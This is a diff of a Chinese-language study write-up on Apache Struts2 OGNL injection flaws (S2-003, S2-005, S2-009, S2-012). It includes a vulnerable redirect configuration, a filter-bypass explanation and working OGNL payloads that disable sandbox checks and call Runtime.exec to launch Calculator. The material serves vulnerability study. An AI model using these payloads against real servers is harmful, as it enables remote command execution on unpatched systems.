@@ -110,6 +110,17 @@ public static Object translateVariables(char open, String expression, ValueStack
 第一轮执行到`stack.findValue()`，取出password的表单传入值，如`%{1+1}`。那么在第二轮递归时，可以满足取`%{`的逻辑，然后再次进入到`stack.findValue()`，这次就是对`%{}`括号内的OGNL进行计算了。
 
 
+### S2-012
+```
+<package name="S2-012" extends="struts-default">
+	<action name="user" class="com.demo.action.UserAction">
+		<result name="redirect" type="redirect">/index.jsp?name=${name}</result>
+		<result name="input">/index.jsp</result>
+		<result name="success">/index.jsp</result>
+	</action>
+</package>
+```
+
 ### S2-003
 S2-003的demo写个Action就行。当访问该Action，如`index.action?(xxxx)`时，ParametersInterceptor拦截器会解析参数，将参数通过setParameters()写入到要执行的Action中。
 ```java
@@ -259,17 +270,17 @@ protected boolean isExcluded(String paramName) {
 (a)(('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(bla))&('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(bla)(bla)&(a)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla))&(b)(('\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')')(bla))
 ```
 
-S2-005在修复时，加强了ParametersInterceptor的`acceptedParamNames`的正则过滤。在加强了`ParametersInterceptor.setParameters()`处理时会先判断是否为acceptableName。用的就是如下的正则匹配来判断
+S2-005在修复时，加强了ParametersInterceptor的`acceptedParamNames`参数名的正则过滤。在加强了`ParametersInterceptor.setParameters()`处理时会先判断是否为acceptableName。用的就是如下的正则匹配来判断
 ```
 acceptedParamNames="[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
 ```
-S2-003时的acceptableName如下
-```java
-protected boolean acceptableName(String name) {
-    return name.indexOf(61) == -1 && name.indexOf(44) == -1 && name.indexOf(35) == -1 && name.indexOf(58) == -1;
-} // 分别对应 `=` `,` `#` `:`
+
+### S2-009
+S2-009是S2-005的绕过。S2-005的修复方式中加强了对参数名`('`，`\'`的过滤。上述S2-005的payload是当作参数名直接传入的。会被过滤掉。但是如果现在参数名使用name此类正常接受的参数，然后将OGNL作为name的参数值。接着利用`z[(name)('lalala')]`来调用name参数值进行OGNL计算。
 ```
-相比而言
+&name=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))(meh)&z[(name)('meh')]=true
+```
+此处需要注意的是Struts2的取参顺序按照ascii大小来排序。这个payload中有两个参数，`name`和`z[(name)('meh')]`。先要让name成功赋值，再通过`()()`获取name进行计算。那么第二个参数的首字符是要大于n的。
 
 
 ### S2-007
